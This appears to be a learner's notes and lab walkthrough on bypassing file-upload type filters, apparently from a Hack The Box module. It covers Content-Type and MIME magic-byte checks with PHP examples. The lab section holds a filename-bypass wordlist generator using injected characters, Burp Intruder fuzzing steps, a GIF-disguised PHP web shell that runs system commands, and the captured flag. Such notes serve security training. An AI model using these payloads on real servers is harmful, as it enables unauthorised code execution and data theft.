# Type Filters

All of this indicates that only testing the file extension is not enough to prevent file upload attacks.

There are two common methods for validating the file content: 
- Content-Type Header
- File Content

## Content-Type

http://SERVER_IP:PORT/

Example of code :

$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

Fuzz Content-Type Wordlist through Burp Intruder :

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt

Note : A file upload HTTP request has two Content-Type headers (one for the main file and one for the attached file) , in some cases we will need to modify both headers

## MIME-Type

MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes.

For example : if a file starts with (GIF87a or GIF89a), this indicates that it is a GIF image.

Example of MIME check :

echo "this is a text file" > text.jpg 
file text.jpg 
text.jpg: ASCII text

echo "GIF8" > text.jpg 
file text.jpg
text.jpg: GIF image data

Example of code using MIME :

$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

We can use a combination of the two methods discussed in this section

## LAB

Change Response Body :

onchange="checkFile(this)"
onchange=""

accept=".jpg,.jpeg,.png"
accept=""

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar'; do
        echo "shell$ext.jpg" >> wordlist.txt
        echo "shell.jpg$ext" >> wordlist.txt
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt

Burp Intruder

echo "GIF8" > text.jpg 

Content-Disposition: form-data; name="uploadFile"; filename="text.jpg"
Content-Type: §image/jpeg§

Payload : image-content-types.txt

All Refused

echo "GIF8<?php system('cat /flag.txt'); ?>" > shell.phar.jpg

http://83.136.251.235:41726/profile_images/shell.phar.jpg

echo "GIF8<?php system('cat /flag.txt'); ?>" > shell.phar.gif

http://83.136.251.235:41726/profile_images/shell.phar.gif

cp shell.phar.gif shell.gif.phar

Content-Disposition: form-data; name="uploadFile"; filename="shell.gif.phar"
Content-Type: image/gif
GIF8<?php system('cat /flag.txt'); ?>

http://83.136.251.235:41726/profile_images/shell.gif.phar
GIF8HTB{m461c4l_c0n73n7_3xpl0174710n}